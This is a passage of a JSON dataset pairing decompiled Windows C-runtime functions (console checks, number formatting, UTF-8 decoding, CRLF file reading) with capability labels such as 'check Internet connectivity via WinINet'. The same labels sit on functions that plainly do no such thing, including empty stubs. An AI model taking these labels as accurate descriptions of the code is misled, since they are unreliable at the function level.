        "decompiled_code": "\nuint32_t __cdecl fcn.0046ed53(uint32_t arg_8h, int32_t arg_ch)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint lpMode;\n    \n    uVar1 = fcn.0046d9b3(arg_8h);\n    if (uVar1 != 0) {\n        iVar3 = arg_8h >> 6;\n        iVar2 = (arg_8h & 0x3f) * 0x38;\n        uVar1 = *(iVar3 * 4 + 0x6cd630);\n        if (*(uVar1 + 0x28 + iVar2) < '\\0') {\n            if (*(arg_ch + 0x14) == '\\0') {\n                fcn.00453bd0();\n            }\n            if ((*(*(arg_ch + 0xc) + 0xa8) != 0) || (uVar1 = *(iVar3 * 4 + 0x6cd630),  *(uVar1 + 0x29 + iVar2) != '\\0'))\n            {\n                uVar1 = (*_sym.imp.KERNEL32.dll_GetConsoleMode)(*(*(iVar3 * 4 + 0x6cd630) + 0x18 + iVar2), &lpMode);\n                return uVar1 & 0xffffff00 | uVar1 != 0;\n            }\n        }\n    }\n    return uVar1 & 0xffffff00;\n}\n",
        "token_count": 327
    },
    "0046f89c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0046f89c(int32_t arg_8h, int32_t arg_ch, char *arg_10h, uint32_t arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    char cVar1;\n    char *pcVar2;\n    uint32_t uVar3;\n    uint *puVar4;\n    uint uVar5;\n    char *pcVar6;\n    uint uVar7;\n    int64_t iVar8;\n    uint uVar9;\n    uint uVar10;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    char *var_8h;\n    uint32_t var_4h;\n    \n    var_8h = arg_10h;\n    var_ch = arg_8h;\n    if (arg_1ch != '\\0') {\n        *arg_10h = '-';\n        var_ch = -arg_8h;\n        var_8h = arg_10h + 1;\n        arg_ch = -(arg_ch + (arg_8h != 0));\n    }\n    pcVar6 = var_8h;\n    iVar8 = CONCAT44(arg_ch, var_ch);\n    var_4h = arg_1ch != '\\0';\n    pcVar2 = var_8h;\n    do {\n        var_8h = pcVar2;\n        uVar7 = iVar8 >> 0x20;\n        uVar3 = fcn.00476c70(iVar8, arg_18h, 0);\n        uVar10 = 0;\n        uVar9 = arg_18h;\n        iVar8 = fcn.00476c00();\n        *var_8h = (-(9 < uVar3) & 0x27U) + 0x30 + uVar3;\n        var_4h = var_4h + 1;\n        if (iVar8 == 0) break;\n        pcVar2 = var_8h + 1;\n    } while (var_4h < arg_14h);\n    if (var_4h < arg_14h) {\n        var_8h[1] = '\\0';\n        do {\n            cVar1 = *var_8h;\n            *var_8h = *pcVar6;\n            var_8h = var_8h + -1;\n            *pcVar6 = cVar1;\n            pcVar6 = pcVar6 + 1;\n        } while (pcVar6 < var_8h);\n        uVar5 = 0;\n    }\n    else {\n        *arg_10h = '\\0';\n        puVar4 = fcn.0043bcb5();\n        uVar5 = 0x22;\n        *puVar4 = 0x22;\n        fcn.0043bb3e(uVar7, uVar9, uVar10);\n    }\n    return uVar5;\n}\n",
        "token_count": 648
    },
    "0046f97e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl\nfcn.0046f97e(int32_t arg_8h, int32_t arg_ch, int16_t *arg_10h, uint32_t arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    int16_t iVar1;\n    int16_t *piVar2;\n    uint32_t uVar3;\n    uint *puVar4;\n    uint uVar5;\n    int16_t *piVar6;\n    int64_t iVar7;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    int16_t *var_8h;\n    uint32_t var_4h;\n    \n    var_8h = arg_10h;\n    var_ch = arg_8h;\n    if (arg_1ch != '\\0') {\n        var_ch = -arg_8h;\n        *arg_10h = 0x2d;\n        var_8h = arg_10h + 1;\n        arg_ch = -(arg_ch + (arg_8h != 0));\n    }\n    piVar6 = var_8h;\n    iVar7 = CONCAT44(arg_ch, var_ch);\n    var_4h = arg_1ch != '\\0';\n    piVar2 = var_8h;\n    do {\n        var_8h = piVar2;\n        uVar3 = fcn.00476c70(iVar7, arg_18h, 0);\n        iVar7 = fcn.00476c00();\n        *var_8h = (-(9 < uVar3) & 0x27) + 0x30 + uVar3;\n        var_4h = var_4h + 1;\n        if (iVar7 == 0) break;\n        piVar2 = var_8h + 1;\n    } while (var_4h < arg_14h);\n    if (var_4h < arg_14h) {\n        var_8h[1] = 0;\n        do {\n            iVar1 = *var_8h;\n            *var_8h = *piVar6;\n            var_8h = var_8h + -1;\n            *piVar6 = iVar1;\n            piVar6 = piVar6 + 1;\n        } while (piVar6 < var_8h);\n        uVar5 = 0;\n    }\n    else {\n        *arg_10h = 0;\n        puVar4 = fcn.0043bcb5();\n        uVar5 = 0x22;\n        *puVar4 = 0x22;\n        fcn.0043bb3e();\n    }\n    return uVar5;\n}\n",
        "token_count": 599
    },
    "00470ede": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00470ede(uint arg_8h)\n\n{\n    uint var_4h;\n    \n    return;\n}\n",
        "token_count": 29
    },
    "00470f17": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00470f17(uint arg_8h)\n\n{\n    uint var_4h;\n    \n    return;\n}\n",
        "token_count": 30
    },
    "00471501": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00471501(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint16_t in_FPUControlWord;\n    uint32_t var_20h;\n    uint32_t var_4h;\n    \n    var_4h = fcn.004711f5(arg_8h);\n    puVar2 = &var_20h;\n    for (iVar1 = 7; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    var_4h = var_4h & 7999;\n    var_20h = var_20h & 0xffff0000 | in_FPUControlWord & 0xffffe0c0 | var_4h;\n    fcn.004710f8(arg_8h);\n    return;\n}\n",
        "token_count": 205
    },
    "004716ae": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.004716ae(uint32_t *arg_8h, uint8_t *arg_ch, uint32_t arg_10h, uint32_t *arg_14h, uint arg_18h)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint8_t uVar4;\n    uint32_t uVar3;\n    uint8_t *puVar5;\n    uint32_t var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint32_t *var_18h;\n    uint8_t var_12h;\n    uint var_11h;\n    uint var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *0x6cade0 ^ &stack0xfffffffc;\n    var_18h = arg_8h;\n    if (arg_14h == NULL) {\n        arg_14h = 0x6cdaf0;\n    }\n    if (arg_ch == NULL) {\n        arg_10h = 1;\n        var_18h = NULL;\n        puVar5 = 0x47d4ae;\n    }\n    else {\n        puVar5 = arg_ch;\n        if (arg_10h == 0) goto code_r0x00471850;\n    }\n    if (*(arg_14h + 6) == 0) {\n        uVar4 = *puVar5;\n        puVar5 = puVar5 + 1;\n        if (-1 < uVar4) {\n            if (var_18h != NULL) {\n                *var_18h = uVar4;\n            }\n            goto code_r0x00471850;\n        }\n        if ((uVar4 & 0xe0) == 0xc0) {\n            uVar3 = CONCAT11(2, uVar4);\n        }\n        else if ((uVar4 & 0xf0) == 0xe0) {\n            uVar3 = CONCAT11(3, uVar4);\n        }\n        else {\n            if ((uVar4 & 0xf8) != 0xf0) goto code_r0x00471848;\n            uVar3 = CONCAT11(4, uVar4);\n        }\n        var_11h._0_1_ = uVar3 >> 8;\n        uVar2 = (1 << (7 - var_11h & 0x1f)) - 1U & uVar3 & 0xff;\n        uVar3 = uVar3 & 0xffffff00 | var_11h;\ncode_r0x00471797:\n        var_24h = uVar3 & 0xff;\n        if (var_24h < arg_10h) {\n            arg_10h = var_24h;\n        }\n        uVar1 = puVar5 - arg_ch;\n        while (uVar1 < arg_10h) {\n            var_12h = *puVar5;\n            puVar5 = puVar5 + 1;\n            uVar1 = uVar1 + 1;\n            uVar3 = uVar3 & 0xffffff00 | var_11h;\n            if ((var_12h & 0xc0) != 0x80) goto code_r0x00471848;\n            uVar2 = uVar2 << 6 | var_12h & 0x3f;\n        }\n        uVar4 = uVar3 >> 8;\n        if (arg_10h < var_24h) {\n            *(arg_14h + 1) = uVar4;\n            *arg_14h = uVar2;\n            *(arg_14h + 6) = uVar3 - arg_10h;\n            goto code_r0x00471850;\n        }\n        if (((uVar2 < 0xd800) || (0xdfff < uVar2)) && (uVar2 < 0x110000)) {\n            stack0xffffffec = 0x80;\n            var_ch = 0x800;\n            var_8h = 0x10000;\n            if ((&var_18h)[uVar4] <= uVar2) {\n                if (var_18h != NULL) {\n                    *var_18h = uVar2;\n                }\n                fcn.00471678(-(uVar2 != 0) & var_24h, arg_14h);\n                goto code_r0x00471850;\n            }\n        }\n    }\n    else {\n        uVar4 = *(arg_14h + 1);\n        var_11h._0_1_ = *(arg_14h + 6);\n        uVar3 = CONCAT11(uVar4, var_11h);\n        uVar2 = *arg_14h;\n        if (((uVar4 - 2 < 3) && (var_11h != 0)) && (var_11h < uVar4)) goto code_r0x00471797;\n    }\ncode_r0x00471848:\n    fcn.0047168c(arg_14h, arg_18h);\ncode_r0x00471850:\n    fcn.004303e9(var_24h);\n    return;\n}\n",
        "token_count": 1169
    },
    "00472088": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.00472088(uint8_t *arg_8h, uint8_t *arg_ch, uint32_t arg_10h, uint arg_14h)\n\n{\n    uint8_t uVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    if (arg_8h == NULL) {\n        puVar2 = fcn.0043bcb5();\n        *puVar2 = 0x16;\n        fcn.0043bb3e();\n        iVar3 = 0x7fffffff;\n    }\n    else if (arg_ch == NULL) {\n        puVar2 = fcn.0043bcb5();\n        *puVar2 = 0x16;\n        fcn.0043bb3e();\n        iVar3 = 0x7fffffff;\n    }\n    else if (arg_10h < 0x80000000) {\n        if (arg_10h == 0) {\n            iVar3 = 0;\n        }\n        else {\n            fcn.00461b27(arg_14h);\n            do {\n                uVar1 = *arg_8h;\n                arg_8h = arg_8h + 1;\n                uVar4 = *(uVar1 + *(var_10h + 0x94));\n                uVar1 = *arg_ch;\n                arg_ch = arg_ch + 1;\n                iVar3 = uVar4 - *(uVar1 + *(var_10h + 0x94));\n                if ((iVar3 != 0) || (uVar4 == 0)) break;\n                arg_10h = arg_10h - 1;\n            } while (arg_10h != 0);\n            if (var_8h != '\\0') {\n                *(var_14h + 0x350) = *(var_14h + 0x350) & 0xfffffffd;\n            }\n        }\n    }\n    else {\n        puVar2 = fcn.0043bcb5();\n        *puVar2 = 0x16;\n        fcn.0043bb3e();\n        iVar3 = 0x7fffffff;\n    }\n    return iVar3;\n}\n",
        "token_count": 527
    },
    "00472153": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_34h\n\nvoid __cdecl\nfcn.00472153(int32_t *arg_8h, uint arg_ch, uint arg_10h, uint8_t *arg_14h, int32_t arg_18h, uint8_t *arg_1ch, \n            int32_t arg_20h, int32_t arg_24h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint unaff_EDI;\n    uint *puVar6;\n    uint var_34h;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint32_t lpCPInfo;\n    uint var_12h;\n    uint32_t var_4h;\n    \n    var_4h = *0x6cade0 ^ &stack0xfffffffc;\n    var_34h = unaff_EDI;\n    if (arg_18h < 1) {\n        if (arg_18h < -1) goto code_r0x0047239d;\n    }\n    else {\n        arg_18h = fcn.00471f9a(arg_14h, arg_18h);\n    }\n    if (arg_20h < 1) {\n        if (arg_20h < -1) goto code_r0x0047239d;\n    }\n    else {\n        arg_20h = fcn.00471f9a(arg_1ch, arg_20h);\n    }\n    if (arg_24h == 0) {\n        arg_24h = *(*arg_8h + 8);\n    }\n    if ((arg_18h == 0) || (arg_20h == 0)) {\n        if ((arg_18h == arg_20h) ||\n           (((1 < arg_20h || (1 < arg_18h)) ||\n            (iVar1 = (*_sym.imp.KERNEL32.dll_GetCPInfo)(arg_24h, &lpCPInfo),  iVar1 == 0)))) goto code_r0x0047239d;\n        if (0 < arg_18h) {\n            if (1 < lpCPInfo) {\n                puVar2 = &var_12h;\n                while (((var_12h != 0 && (*(puVar2 + 1) != 0)) && ((*arg_14h < *puVar2 || (*(puVar2 + 1) < *arg_14h)))))\n                {\n                    puVar2 = puVar2 + 2;\n                    var_12h._0_1_ = *puVar2;\n                }\n            }\n            goto code_r0x0047239d;\n        }\n        if (0 < arg_20h) {\n            if (1 < lpCPInfo) {\n                puVar2 = &var_12h;\n                while (((var_12h != 0 && (*(puVar2 + 1) != 0)) && ((*arg_1ch < *puVar2 || (*(puVar2 + 1) < *arg_1ch)))))\n                {\n                    puVar2 = puVar2 + 2;\n                    var_12h._0_1_ = *puVar2;\n                }\n            }\n            goto code_r0x0047239d;\n        }\n    }\n    puVar2 = &var_34h;\n    puVar6 = &var_34h;\n    iVar1 = fcn.004630d8(arg_24h, 9, arg_14h, arg_18h, 0, 0);\n    if (iVar1 == 0) goto code_r0x0047239d;\n    uVar3 = iVar1 * 2 + 8;\n    uVar3 = -(iVar1 * 2 < uVar3) & uVar3;\n    if (uVar3 == 0) {\ncode_r0x004723e7:\n        puVar2 = NULL;\n    }\n    else {\n        if (0x400 < uVar3) {\n            puVar2 = fcn.0045d1bf(uVar3);\n            if (puVar2 != NULL) {\n                *puVar2 = 0xdddd;\n                goto code_r0x004722e2;\n            }\n            goto code_r0x004723e7;\n        }\n        fcn.00476f20();\n        if (*0x10 == 0x38) goto code_r0x004723e7;\n        var_34h = 0xcccc;\ncode_r0x004722e2:\n        puVar2 = puVar2 + 2;\n        if (puVar2 == NULL) goto code_r0x004723e7;\n        iVar4 = fcn.004630d8(arg_24h, 1, arg_14h, arg_18h, puVar2, iVar1);\n        if ((iVar4 != 0) && (iVar4 = fcn.004630d8(arg_24h, 9, arg_1ch, arg_20h, 0, 0),  iVar4 != 0)) {\n            uVar3 = iVar4 * 2 + 8;\n            uVar3 = -(iVar4 * 2 < uVar3) & uVar3;\n            if (uVar3 == 0) {\ncode_r0x004723db:\n                puVar6 = NULL;\n            }\n            else {\n                if (0x400 < uVar3) {\n                    puVar6 = fcn.0045d1bf(uVar3);\n                    if (puVar6 != NULL) {\n                        *puVar6 = 0xdddd;\n                        goto code_r0x0047236d;\n                    }\n                    goto code_r0x004723db;\n                }\n                fcn.00476f20();\n                if (*0x10 == 0x38) goto code_r0x004723db;\n                var_34h = 0xcccc;\ncode_r0x0047236d:\n                puVar6 = puVar6 + 2;\n                if (puVar6 == NULL) goto code_r0x004723db;\n                iVar5 = fcn.004630d8(arg_24h, 1, arg_1ch, arg_20h, puVar6, iVar4);\n                if (iVar5 != 0) {\n                    fcn.00460311(arg_ch, arg_10h, puVar2, iVar1, puVar6, iVar4, 0, 0, 0);\n                    fcn.00466884(puVar6);\n                    fcn.00466884(puVar2);\n                    goto code_r0x0047239d;\n                }\n            }\n            fcn.00466884(puVar6);\n            fcn.00466884(puVar2);\n            goto code_r0x0047239d;\n        }\n    }\n    fcn.00466884(puVar2);\ncode_r0x0047239d:\n    fcn.004303e9(arg_ch);\n    return;\n}\n",
        "token_count": 1570
    },
    "00472588": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: lpBuffer\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.00472588(uint32_t arg_8h, char *arg_ch, int32_t arg_10h)\n\n{\n    uint8_t *puVar1;\n    char cVar2;\n    uint8_t uVar3;\n    uint uVar4;\n    char *pcVar5;\n    int32_t iVar6;\n    char *pcVar7;\n    char *pcVar8;\n    int32_t iVar9;\n    uint hFile;\n    char *lpNumberOfBytesRead;\n    int32_t var_ch;\n    char *var_8h;\n    uint lpBuffer;\n    \n    var_ch = arg_8h >> 6;\n    iVar9 = (arg_8h & 0x3f) * 0x38;\n    iVar6 = *(var_ch * 4 + 0x6cd630);\n    uVar4 = *(iVar9 + 0x18 + iVar6);\n    if ((arg_10h == 0) || (*arg_ch != '\\n')) {\n        puVar1 = iVar9 + 0x28 + iVar6;\n        *puVar1 = *puVar1 & 0xfb;\n    }\n    else {\n        puVar1 = iVar9 + 0x28 + iVar6;\n        *puVar1 = *puVar1 | 4;\n    }\n    lpNumberOfBytesRead = arg_ch + arg_10h;\n    var_8h = arg_ch;\n    pcVar8 = arg_ch;\n    pcVar7 = arg_ch;\n    if (arg_ch < lpNumberOfBytesRead) {\n        do {\n            cVar2 = *var_8h;\n            pcVar8 = pcVar7;\n            if (cVar2 == '\\x1a') {\n                iVar6 = *(var_ch * 4 + 0x6cd630);\n                uVar3 = *(iVar6 + 0x28 + iVar9);\n                if ((uVar3 & 0x40) == 0) {\n                    *(iVar6 + 0x28 + iVar9) = uVar3 | 2;\n                }\n                else {\n                    *pcVar7 = '\\x1a';\ncode_r0x004726cb:\n                    pcVar8 = pcVar7 + 1;\n                }\n                break;\n            }\n            pcVar5 = var_8h + 1;\n            if (cVar2 == '\\r') {\n                if (lpNumberOfBytesRead <= pcVar5) {\n                    iVar6 = (*_sym.imp.KERNEL32.dll_ReadFile)(uVar4, &lpBuffer, 1, &lpNumberOfBytesRead, 0);\n                    if ((iVar6 != 0) && (lpNumberOfBytesRead != NULL)) {\n                        if ((*(*(var_ch * 4 + 0x6cd630) + 0x28 + iVar9) & 0x48) != 0) {\n                            pcVar8 = pcVar7 + 1;\n                            if (lpBuffer == '\\n') {\n                                *pcVar7 = '\\n';\n                            }\n                            else {\n                                *pcVar7 = '\\r';\n                                *(*(var_ch * 4 + 0x6cd630) + 0x2a + iVar9) = lpBuffer;\n                            }\n                            break;\n                        }\n                        if ((lpBuffer == '\\n') && (pcVar7 == arg_ch)) {\n                            *pcVar7 = '\\n';\n                            goto code_r0x004726cb;\n                        }\n                        fcn.00471ee0(arg_8h, 0xffffffff, 0xffffffff, 1);\n                        if (lpBuffer == '\\n') break;\n                    }\n                    *pcVar7 = '\\r';\n                    goto code_r0x004726cb;\n                }\n                cVar2 = *pcVar5;\n                pcVar5 = var_8h + (cVar2 == '\\n') + 1;\n                *pcVar7 = ((cVar2 == '\\n') - 1U & 3) + 10;\n            }\n            else {\n                *pcVar7 = cVar2;\n            }\n            pcVar8 = pcVar7 + 1;\n            pcVar7 = pcVar8;\n            var_8h = pcVar5;\n        } while (pcVar5 < lpNumberOfBytesRead);\n    }\n    return pcVar8 - arg_ch;\n}\n",
        "token_count": 955
    },
    "004726d5": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.004726d5(uint32_t arg_8h, uint16_t *arg_ch, int32_t arg_10h)\n\n{\n    uint8_t *puVar1;\n    uint8_t uVar2;\n    uint uVar3;\n    uint16_t uVar4;\n    uint16_t *puVar5;\n    int32_t iVar6;\n    uint16_t *puVar7;\n    uint16_t *puVar8;\n    int32_t iVar9;\n    uint hFile;\n    int32_t lpNumberOfBytesRead;\n    uint32_t var_14h;\n    uint var_10h;\n    uint16_t *var_ch;\n    int32_t var_8h;\n    uint16_t *lpBuffer;\n    \n    var_8h = arg_8h >> 6;\n    iVar9 = (arg_8h & 0x3f) * 0x38;\n    iVar6 = *(var_8h * 4 + 0x6cd630);\n    lpNumberOfBytesRead = 10;\n    uVar3 = *(iVar6 + 0x18 + iVar9);\n    if ((arg_10h == 0) || (*arg_ch != 10)) {\n        puVar1 = iVar6 + 0x28 + iVar9;\n        *puVar1 = *puVar1 & 0xfb;\n    }\n    else {\n        puVar1 = iVar6 + 0x28 + iVar9;\n        *puVar1 = *puVar1 | 4;\n    }\n    var_ch = arg_ch + arg_10h;\n    lpBuffer = arg_ch;\n    puVar8 = arg_ch;\n    if (arg_ch < var_ch) {\n        var_10h = 0xd;\n        puVar7 = arg_ch;\n        do {\n            uVar4 = *lpBuffer;\n            var_14h = uVar4;\n            puVar8 = puVar7;\n            if (var_14h == 0x1a) {\n                iVar6 = *(var_8h * 4 + 0x6cd630);\n                uVar2 = *(iVar6 + 0x28 + iVar9);\n                if ((uVar2 & 0x40) == 0) {\n                    *(iVar6 + 0x28 + iVar9) = uVar2 | 2;\n                }\n                else {\n                    *puVar7 = uVar4;\ncode_r0x00472880:\n                    puVar8 = puVar7 + 1;\n                }\n                break;\n            }\n            puVar5 = lpBuffer + 1;\n            if (uVar4 == 0xd) {\n                if (var_ch <= puVar5) {\n                    iVar6 = (*_sym.imp.KERNEL32.dll_ReadFile)(uVar3, &lpBuffer, 2, &lpNumberOfBytesRead, 0);\n                    if ((iVar6 == 0) || (lpNumberOfBytesRead == 0)) {\ncode_r0x0047285e:\n                        uVar4 = 0xd;\n                    }\n                    else {\n                        if ((*(*(var_8h * 4 + 0x6cd630) + 0x28 + iVar9) & 0x48) != 0) {\n                            puVar8 = puVar7 + 1;\n                            if (lpBuffer == 10) {\n                                *puVar7 = 10;\n                            }\n                            else {\n                                *puVar7 = 0xd;\n                                *(*(var_8h * 4 + 0x6cd630) + 0x2a + iVar9) = lpBuffer;\n                                *(*(var_8h * 4 + 0x6cd630) + 0x2b + iVar9) = lpBuffer >> 8;\n                                *(*(var_8h * 4 + 0x6cd630) + 0x2c + iVar9) = 10;\n                            }\n                            break;\n                        }\n                        uVar4 = 10;\n                        if ((lpBuffer != 10) || (puVar7 != arg_ch)) {\n                            fcn.00471ee0(arg_8h, 0xfffffffe, 0xffffffff, 1);\n                            if (lpBuffer != 10) goto code_r0x0047285e;\n                            break;\n                        }\n                    }\n                    *puVar7 = uVar4;\n                    goto code_r0x00472880;\n                }\n                uVar4 = *puVar5;\n                puVar5 = lpBuffer + (uVar4 == 10) + 1;\n                *puVar7 = ((uVar4 == 10) - 1 & 3) + 10;\n            }\n            else {\n                *puVar7 = uVar4;\n            }\n            puVar8 = puVar7 + 1;\n            puVar7 = puVar8;\n            lpBuffer = puVar5;\n        } while (puVar5 < var_ch);\n    }\n    return puVar8 - arg_ch & 0xfffffffe;\n}\n",
        "token_count": 1095
    },
    "00472bdf": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.00472bdf(uint32_t arg_8h, char *arg_ch, uint32_t arg_10h)\n\n{\n    char cVar1;\n    uint *puVar2;\n    char *pcVar3;\n    char *pcVar4;\n    uint32_t uVar5;\n    char *arg_8h_00;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint32_t uVar8;\n    ulong uVar9;\n    uint lpMode;\n    char *var_20h;\n    uint32_t var_1ch;\n    uint32_t lpNumberOfBytesRead;\n    uint hConsoleHandle;\n    int32_t var_10h;\n    char *lpBuffer;\n    uint32_t var_8h;\n    uint var_1h;\n    \n    if (arg_8h == 0xfffffffe) {\n        puVar2 = fcn.0043bca2();\n        *puVar2 = 0;\n        puVar2 = fcn.0043bcb5();\n        *puVar2 = 9;\n        return 0xffffffff;\n    }\n    if ((-1 < arg_8h) && (arg_8h < *0x6cd830)) {\n        var_8h = arg_8h >> 6;\n        iVar6 = (arg_8h & 0x3f) * 0x38;\n        var_1ch = 1;\n        iVar7 = *(var_8h * 4 + 0x6cd630);\n        var_1h._0_1_ = *(iVar6 + 0x28 + iVar7);\n        var_10h = iVar6;\n        if ((var_1h & 1) != 0) {\n            if (arg_10h < 0x80000000) {\n                if ((arg_10h == 0) || ((var_1h & 2) != 0)) {\n                    return 0;\n                }\n                if (arg_ch != NULL) {\n                    hConsoleHandle = *(iVar6 + 0x18 + iVar7);\n                    var_1h._0_1_ = *(iVar6 + 0x29 + iVar7);\n                    if (var_1h == '\\x01') {\n                        if ((~arg_10h & 1) == 0) goto code_r0x00472cad;\n                        uVar8 = 4;\n                        if (3 < arg_10h >> 1) {\n                            uVar8 = arg_10h >> 1;\n                        }\n                        pcVar3 = fcn.0045d1bf(uVar8);\n                        fcn.0045d185(0);\n                        fcn.0045d185(0);\n                        lpBuffer = pcVar3;\n                        if (pcVar3 != NULL) {\n                            uVar9 = fcn.00471ee0(arg_8h, 0, 0, 1);\n                            iVar7 = *(var_8h * 4 + 0x6cd630);\n                            *(iVar6 + 0x20 + iVar7) = uVar9;\n                            *(iVar6 + 0x24 + iVar7) = uVar9 >> 0x20;\n                            arg_8h_00 = pcVar3;\n                            goto code_r0x00472d46;\n                        }\n                        puVar2 = fcn.0043bcb5();\n                        *puVar2 = 0xc;\n                        puVar2 = fcn.0043bca2();\n                        *puVar2 = 8;\n                    }\n                    else if ((var_1h == '\\x02') && ((~arg_10h & 1) == 0)) {\ncode_r0x00472cad:\n                        puVar2 = fcn.0043bca2();\n                        *puVar2 = 0;\n                        puVar2 = fcn.0043bcb5();\n                        *puVar2 = 0x16;\n                        fcn.0043bb3e();\n                        pcVar3 = NULL;\n                    }\n                    else {\n                        lpBuffer = arg_ch;\n                        pcVar3 = arg_ch;\n                        uVar8 = arg_10h;\n                        arg_8h_00 = NULL;\ncode_r0x00472d46:\n                        iVar7 = 0;\n                        lpNumberOfBytesRead = *(var_8h * 4 + 0x6cd630);\n                        uVar5 = uVar8;\n                        pcVar4 = lpBuffer;\n                        if ((((*(var_10h + 0x28 + lpNumberOfBytesRead) & 0x48) != 0) &&\n                            (cVar1 = *(var_10h + 0x2a + lpNumberOfBytesRead),  cVar1 != '\\n')) && (uVar8 != 0)) {\n                            iVar7 = 1;\n                            *lpBuffer = cVar1;\n                            pcVar4 = lpBuffer + 1;\n                            uVar5 = uVar8 - 1;\n                            *(var_10h + 0x2a + *(var_8h * 4 + 0x6cd630)) = 10;\n                            if (((var_1h != '\\0') &&\n                                (cVar1 = *(var_10h + 0x2b + *(var_8h * 4 + 0x6cd630)),  cVar1 != '\\n')) && (uVar5 != 0))\n                            {\n                                *pcVar4 = cVar1;\n                                pcVar4 = lpBuffer + 2;\n                                uVar5 = uVar8 - 2;\n                                iVar7 = 2;\n                                *(var_10h + 0x2b + *(var_8h * 4 + 0x6cd630)) = 10;\n                                if (((var_1h == '\\x01') &&\n                                    (cVar1 = *(var_10h + 0x2c + *(var_8h * 4 + 0x6cd630)),  cVar1 != '\\n')) &&\n                                   (uVar5 != 0)) {\n                                    *pcVar4 = cVar1;\n                                    uVar5 = uVar8 - 3;\n                                    iVar7 = 3;\n                                    *(var_10h + 0x2c + *(var_8h * 4 + 0x6cd630)) = 10;\n                                    pcVar4 = lpBuffer + 3;\n                                }\n                            }\n                        }\n                        lpBuffer = pcVar4;\n                        var_20h = pcVar3;\n                        iVar6 = fcn.0046d9b3(arg_8h);\n                        pcVar3 = arg_8h_00;\n                        if (((iVar6 == 0) || (-1 < *(var_10h + 0x28 + *(var_8h * 4 + 0x6cd630)))) ||\n                           (iVar6 = (*_sym.imp.KERNEL32.dll_GetConsoleMode)(hConsoleHandle, 